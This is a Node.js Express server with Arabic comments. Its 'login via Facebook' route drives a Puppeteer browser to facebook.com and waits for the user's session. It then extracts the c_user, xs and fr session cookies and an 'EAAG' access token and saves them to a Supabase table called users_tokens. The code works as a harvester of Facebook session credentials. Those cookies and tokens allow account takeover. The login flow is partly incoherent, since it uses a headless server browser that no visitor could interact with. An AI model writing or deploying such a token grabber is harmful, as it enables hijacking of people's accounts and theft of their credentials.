const express = require('express');
const { createClient } = require('@supabase/supabase-js');
const puppeteer = require('puppeteer');
const path = require('path');

const app = express();
app.use(express.urlencoded({ extended: true }));

// إعداد اتصال Supabase باستخدام المتغيرات البيئية للحماية
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);

// عرض الصفحة الرئيسية (index.html)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// مسار تسجيل الدخول عبر الفيسبوك
app.get('/login-facebook', async (req, res) => {
    let browser;
    try {
        // تشغيل المتصفح (دعم بيئة السيرفر والدكر)
        browser = await puppeteer.launch({
            headless: true, // يفضل جعله true على الاستضافات السحابية
            args: ['--no-sandbox', '--disable-setuid-sandbox']
        });
        const page = await browser.newPage();
        await page.goto('https://facebook.com');

        // الانتظار حتى يسجل المستخدم دخوله ويظهر كوكيز c_user
        let cUserCookie = null;
        let attempts = 0;
        while (!cUserCookie && attempts < 60) { // انتظار لمدة دقيقتين كحد أقصى
            const cookies = await page.cookies();
            cUserCookie = cookies.find(c => c.name === 'c_user');
            if (!cUserCookie) {
                await new Promise(r => setTimeout(r, 2000));
                attempts++;
            }
        }

        if (!cUserCookie) {
            await browser.close();
            return res.send("<h3 style='color:red; text-align:center;'>انتهت مهلة الانتظار ولم يتم تسجيل الدخول.</h3>");
        }

        // استخراج الكوكيز والتوكن
        const cookies = await page.cookies();
        const c_user = cookies.find(c => c.name === 'c_user')?.value || '';
        const xs = cookies.find(c => c.name === 'xs')?.value || '';
        const fr = cookies.find(c => c.name === 'fr')?.value || '';

        const token = await page.evaluate(() => {
            try {
                let match = document.documentElement.innerHTML.match(/"(EAAG[^\"]+)"/);
                if (match) return match[1];
                return window.__accessToken || "لم يتم العثور على التوكن تلقائياً";
            } catch(e) {
                return "خطأ في استخراج التوكن";
            }
        });

        await browser.close();

        // حفظ البيانات في جدول users_tokens في Supabase
        const { data, error } = await supabase
            .from('users_tokens')
            .insert([{ c_user, xs_token: xs, fr_token: fr, access_token: token }]);

        if (error) {
            console.error('Supabase Error:', error.message);
            return res.send("حدث خطأ أثناء حفظ البيانات في قاعدة البيانات السحابية.");
        }

        // عرض النتيجة للمستخدم
        res.send(`
            <div style="font-family: Tahoma; direction: rtl; text-align: center; margin-top: 50px;">
                <h2 style="color: green;">تم تسجيل الدخول وحفظ البيانات في Supabase بنجاح!</h2>
                <p><strong>رقم المستخدم (c_user):</strong> ${c_user}</p>
                <p><strong>Access Token:</strong><br><textarea style="width: 80%; height: 60px;" readonly>${token}</textarea></p>
                <br><a href="/">العودة للرئيسية</a>
            </div>
        `);

    } catch (error) {
        if (browser) await browser.close();
        res.status(500).send(`حدث خطأ: ${error.message}`);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`الخادم يعمل على البورت ${PORT}`);
});
